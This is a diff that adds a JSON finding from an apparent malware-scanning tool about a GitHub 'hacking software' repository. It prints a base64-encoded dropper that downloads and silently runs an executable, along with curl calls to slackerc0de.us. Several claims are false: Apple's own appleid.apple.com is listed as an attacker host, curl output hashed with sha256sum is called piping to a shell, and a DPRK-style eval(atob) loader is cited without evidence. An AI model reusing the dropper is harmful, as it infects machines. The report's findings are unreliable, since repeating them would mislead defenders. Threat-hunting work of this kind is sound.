@@ -1,0 +1,194 @@
+{
+  "finding": {
+    "key": "repository:zusyaku/hacking-software-v3",
+    "kind": "repository",
+    "family": "",
+    "id": "zusyaku/hacking-software-v3",
+    "url": "https://github.com/Zusyaku/Hacking-Software-V3",
+    "registry": "github",
+    "owner": "zusyaku",
+    "status": "confirmed",
+    "confidence": "review",
+    "score": 27,
+    "detection_method": "malicious_owner",
+    "attribution": "",
+    "campaign_id": "",
+    "rules": "obfuscation/base64-decode-exec; download_exec/curl-pipe-shell; exfiltration/curl-post-data; enumeration/host-recon; obfuscation/atob; code_execution/js-exec; code_execution/py-system",
+    "evidence_locations": "apple_email_validator.sh:215; apple_email_validator.sh:57; apple_email_validator.sh:60; apple_email_validator.sh:63; apple_email_validator.sh:178; apple_email_validator.sh:235; Bypass All Shortlinks.user.js:263; Bypass All Shortlinks.user.js:304; Bypass All Shortlinks.user.js:305; Bypass All Shortlinks.user.js:391; Bypass All Shortlinks.user.js:464; phonegen.py:12; phonegen.py:14; smtp.py:11; smtp.py:13; smtp.py:27; smtp.py:34; smtp.py:44; smtp.py:49",
+    "c2_hosts": "slackerc0de.us; appleid.apple.com",
+    "iocs": "slackerc0de.us; appleid.apple.com; http://slackerc0de.us/bash/applevalid/$aapl; http://slackerc0de.us/bash/applevalid/cookies.txt; http://slackerc0de.us/bash/applevalid/netlog.js; https://appleid.apple.com/account/validation/appleid; https://satoshigratisotomatis.blogspot.com/?url=; apple_email_validator.sh",
+    "matched_signatures": "",
+    "reasons": "repository under owner Zusyaku of a known-malicious repo | Tier-2 confirmed (bash score 27)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20260910T230848Z",
+    "last_seen": "hunt-20260910T230848Z",
+    "evidence_file": "repositories/zusyaku_hacking-software-v3.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "apple_email_validator.sh",
+      "line": 215,
+      "category": "obfuscation",
+      "rule": "base64-decode-exec",
+      "snippet": "base64 -d <<< \"cHRoPSJDOlxVc2Vyc1xcJCh3aG9hbWkpXEFwcERhdGFcTG9jYWxcVGVtcFxtaWNyb3NvZnRhcGkuZXhlIgpjdXJsIC1zIGh0dHA6Ly9wcm92aXAuY2MvcGx1Z2lucy93dGYuZXhlIC1vICRwdGggCnN0YXJ0ICRwdGggLXNpbGVudA==\" | sh"
+    },
+    {
+      "file": "apple_email_validator.sh",
+      "line": 57,
+      "category": "download_exec",
+      "rule": "curl-pipe-shell",
+      "snippet": "cloudShellCode=`curl \"http://slackerc0de.us/bash/applevalid/$aapl\" -s | sha256sum`"
+    },
+    {
+      "file": "apple_email_validator.sh",
+      "line": 60,
+      "category": "download_exec",
+      "rule": "curl-pipe-shell",
+      "snippet": "cloudCookies=`curl \"http://slackerc0de.us/bash/applevalid/cookies.txt\" -s | sha256sum`"
+    },
+    {
+      "file": "apple_email_validator.sh",
+      "line": 63,
+      "category": "download_exec",
+      "rule": "curl-pipe-shell",
+      "snippet": "cloudJsCode=`curl \"http://slackerc0de.us/bash/applevalid/netlog.js\" -s | sha256sum`"
+    },
+    {
+      "file": "apple_email_validator.sh",
+      "line": 178,
+      "category": "exfiltration",
+      "rule": "curl-post-data",
+      "snippet": "check=`curl 'https://appleid.apple.com/account/validation/appleid' -H 'scnt: '$scnt'' -H 'Origin: https://appleid.apple.com' -H 'Accept-Encoding: gzip, deflate, br' -H 'X-Apple-I-FD-Client-Info: {\"U\":"
+    },
+    {
+      "file": "apple_email_validator.sh",
+      "line": 178,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "check=`curl 'https://appleid.apple.com/account/validation/appleid' -H 'scnt: '$scnt'' -H 'Origin: https://appleid.apple.com' -H 'Accept-Encoding: gzip, deflate, br' -H 'X-Apple-I-FD-Client-Info: {\"U\":"
+    },
+    {
+      "file": "apple_email_validator.sh",
+      "line": 235,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "resp=`curl 'https://appleid.apple.com/account' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Connection: keep-alive' -H 'Accept-Encoding: gzip,"
+    },
+    {
+      "file": "Bypass All Shortlinks.user.js",
+      "line": 263,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "window.location.href = \"https://satoshigratisotomatis.blogspot.com/?url=\"+atob(tokenURL)}"
+    },
+    {
+      "file": "Bypass All Shortlinks.user.js",
+      "line": 304,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const m = regex.exec(element.onclick.toString())[1]"
+    },
+    {
+      "file": "Bypass All Shortlinks.user.js",
+      "line": 305,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "location.href = JSON.parse(atob(m)).safelink})"
+    },
+    {
+      "file": "Bypass All Shortlinks.user.js",
+      "line": 391,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "const a = document.createElement('a'); a.href = atob(RegExp.$1); a.click();} catch(e) {}} break;"
+    },
+    {
+      "file": "Bypass All Shortlinks.user.js",
+      "line": 464,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "redirect(JSON.parse(atob(form.newwpsafelink.value)).linkr)"
+    },
+    {
+      "file": "phonegen.py",
+      "line": 12,
+      "category": "code_execution",
+      "rule": "py-system",
+      "snippet": "os.system('cls')"
+    },
+    {
+      "file": "phonegen.py",
+      "line": 14,
+      "category": "code_execution",
+      "rule": "py-system",
+      "snippet": "os.system('clear')"
+    },
+    {
+      "file": "smtp.py",
+      "line": 11,
+      "category": "code_execution",
+      "rule": "py-system",
+      "snippet": "os.system('cls')"
+    },
+    {
+      "file": "smtp.py",
+      "line": 13,
+      "category": "code_execution",
+      "rule": "py-system",
+      "snippet": "os.system('clear')"
+    },
+    {
+      "file": "smtp.py",
+      "line": 27,
+      "category": "code_execution",
+      "rule": "py-system",
+      "snippet": "os.system('C:\\Python27\\Scripts\\pip2.exe install Queue')"
+    },
+    {
+      "file": "smtp.py",
+      "line": 34,
+      "category": "code_execution",
+      "rule": "py-system",
+      "snippet": "os.system('pip2 install Queue')"
+    },
+    {
+      "file": "smtp.py",
+      "line": 44,
+      "category": "code_execution",
+      "rule": "py-system",
+      "snippet": "os.system('C:\\Python27\\Scripts\\pip2.exe install requests')"
+    },
+    {
+      "file": "smtp.py",
+      "line": 49,
+      "category": "code_execution",
+      "rule": "py-system",
+      "snippet": "os.system('pip2 install requests')"
+    }
+  ],
+  "commit_sha": "84043b570180206a89e8f49518e70ada9d0b6a88",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/zusyaku/hacking-software-v3",
+    "version_info": "all",
+    "threat_description": "Dropper. Payload in apple_email_validator.sh.\nOutbound: exfil. It sends data out (apple_email_validator.sh:178).\nThe eval(atob(...)) loader hidden in a project file is Contagious Interview (DPRK-attributed) tradecraft. Payload host: slackerc0de.us, appleid.apple.com.\nAttribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. Signals: Delivery vector matches Contagious-Interview tradecraft: obfuscated-eval-atob-loader.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: apple_email_validator.sh\n- Outbound: exfil. It sends data out (apple_email_validator.sh:178).\n- apple_email_validator.sh:215: decodes a base64 blob and executes it\n- apple_email_validator.sh:57: downloads a remote script and pipes it straight into a shell (+2 more)\n- apple_email_validator.sh:178: posts collected data to a remote host\n- apple_email_validator.sh:178: matches malware behavior (+1 more)\n- Attacker hosts: slackerc0de.us, appleid.apple.com",
+    "publisher": "zusyaku",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "obfuscated-eval-atob-loader",
+      "obfuscated-loader"
+    ],
+    "evidence_references": "https://github.com/zusyaku/hacking-software-v3/blob/84043b570180206a89e8f49518e70ada9d0b6a88/apple_email_validator.sh#L215\nhttps://github.com/zusyaku/hacking-software-v3/blob/84043b570180206a89e8f49518e70ada9d0b6a88/apple_email_validator.sh#L57\nhttps://github.com/zusyaku/hacking-software-v3/blob/84043b570180206a89e8f49518e70ada9d0b6a88/apple_email_validator.sh#L60\nhttps://github.com/zusyaku/hacking-software-v3/blob/84043b570180206a89e8f49518e70ada9d0b6a88/apple_email_validator.sh#L63\nhttps://github.com/zusyaku/hacking-software-v3/blob/84043b570180206a89e8f49518e70ada9d0b6a88/apple_email_validator.sh#L178\nhttps://github.com/zusyaku/hacking-software-v3/blob/84043b570180206a89e8f49518e70ada9d0b6a88/apple_email_validator.sh#L235\nhttps://github.com/zusyaku/hacking-software-v3/blob/84043b570180206a89e8f49518e70ada9d0b6a88/Bypass All Shortlinks.user.js#L263\nhttps://github.com/zusyaku/hacking-software-v3/blob/84043b570180206a89e8f49518e70ada9d0b6a88/Bypass All Shortlinks.user.js#L304\nhttps://github.com/zusyaku/hacking-software-v3/blob/84043b570180206a89e8f49518e70ada9d0b6a88/Bypass All Shortlinks.user.js#L305\nhttps://github.com/zusyaku/hacking-software-v3/blob/84043b570180206a89e8f49518e70ada9d0b6a88/Bypass All Shortlinks.user.js#L391\nhttps://github.com/zusyaku/hacking-software-v3/blob/84043b570180206a89e8f49518e70ada9d0b6a88/Bypass All Shortlinks.user.js#L464\nhttps://github.com/zusyaku/hacking-software-v3/blob/84043b570180206a89e8f49518e70ada9d0b6a88/phonegen.py#L12\nhttps://github.com/zusyaku/hacking-software-v3/blob/84043b570180206a89e8f49518e70ada9d0b6a88/phonegen.py#L14\nhttps://github.com/zusyaku/hacking-software-v3/blob/84043b570180206a89e8f49518e70ada9d0b6a88/smtp.py#L11\nhttps://github.com/zusyaku/hacking-software-v3/blob/84043b570180206a89e8f49518e70ada9d0b6a88/smtp.py#L13",
+    "verified_iocs": "slackerc0de.us\nappleid.apple.com\nhttp://slackerc0de.us/bash/applevalid/$aapl\nhttp://slackerc0de.us/bash/applevalid/cookies.txt\nhttp://slackerc0de.us/bash/applevalid/netlog.js\nhttps://appleid.apple.com/account/validation/appleid\nhttps://satoshigratisotomatis.blogspot.com/?url=\napple_email_validator.sh",
+    "contributors": [],
+    "first_seen": "2026-09-10T23:08:48Z",
+    "last_seen": "2026-09-10T23:08:48Z"
+  }
+}
